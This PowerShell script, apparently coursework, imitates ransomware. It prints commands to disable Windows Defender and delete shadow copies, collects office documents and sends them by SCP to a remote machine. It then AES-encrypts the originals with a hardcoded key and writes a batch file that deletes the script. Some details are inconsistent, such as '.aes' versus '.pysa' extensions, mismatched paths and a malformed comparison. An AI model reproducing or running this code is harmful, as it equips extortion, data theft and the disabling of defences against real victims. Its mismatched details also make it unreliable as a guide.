<#
.SYNOPSIS
Encryptes or Decrypts Strings or Byte-Arrays with AES
 
.DESCRIPTION
Takes a String or File and a Key and encrypts or decrypts it with AES256 (CBC)
 
.PARAMETER Mode
Encryption or Decryption Mode
 
.PARAMETER Key
Key used to encrypt or decrypt
 
.PARAMETER Text
String value to encrypt or decrypt
 
.PARAMETER Path
Filepath for file to encrypt or decrypt
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
 
Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded cipher text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

# Task 2 to Disable Windows Defender and Controlled Folder Access
Write-Output "`n To disable Windows Defender and Controlled Folder Access, you can run: 
Set-MpPreference -DisableRealtimeMonitoring $true -EnableControlledFolderAccess Disabled"

# Delete all shadow copies
Write-Output "`nTo Delete all shadow copies, you can run: 
vssadmin.exe Delete Shadows /All /Quiet`n"


# List the files in a directory and save to CSV file
Get-Childitem -Recurse -Include *.docx,*.pdf,*.xlsx -Path '.\Week 14\Homework\Documents' | export-csv `
-Path '.\Week 14\Homework\files.csv'

# Import CSV 
$fileList = Import-Csv -Path '.\Week 14\Homework\files.csv' -Header FullName

# If \thefiles does not exist, create it. I added this because every time I ran my code, it would keep trying to create \thefiles. 
# Every time, it would throw an error saying "it already exists!" I got fed up with seeing the error so I added this.
if (!(Test-Path -Path ".\Week 14\Homework\thefiles")) {

    New-Item -Path ".\Week 14\Homework\" -Name "thefiles" -ItemType "directory" 
    
}
# For each file in the CSV

foreach ($f in $fileList) {
    
    Get-ChildItem -Path $f.FullName -ErrorAction Ignore | Copy-Item -Destination ".\Week 14\Homework\thefiles" 

}

# Zip the file and save to files.zip
Compress-Archive -Path ".\Week 14\Homework\thefiles" -Destination ".\Week 14\Homework\thefiles.zip" -Force

# Send .zip over SCP
function scpToDevice {

Set-SCPItem -ComputerName '192.168.7.116' -Port 22 -Credential (Get-Credential -Message "Please enter your credentials") -Path ".\Week 14\Homework\thefiles.zip" -Destination "C:\Users\micah.kezar\Desktop"
return $true;

}

if (scpToDevice == $true) {
    Write-Output "`n The File has successfully been sent! `n"
}

# For each file in the CSV
foreach ($f in $fileList) {
    
    # Encrypt every single file within the CSV file
    Invoke-AESEncryption -Mode Encrypt -key "MySuperSecurePassword" -Path $f.FullName -ErrorAction Ignore

}
# Create .bat file with code to delete step2.ps1
if (!(Test-Path -Path ".\Week 14\Homework\update.bat")) {

    New-Item -Path '.\Week 14\Homework\update.bat'
    Set-Content -Path '.\Week 14\Homework\update.bat' "del C:\Users\micah\Documents\SYS320\SYS_320_FA22\Week 14\Homework\step2.ps1"
    
}


# Run the newly created .bat
Start-Process -Path "C:\Users\micah\Documents\SYS320\SYS_320_FA22\Week 13\Homework\update.bat" -Wait


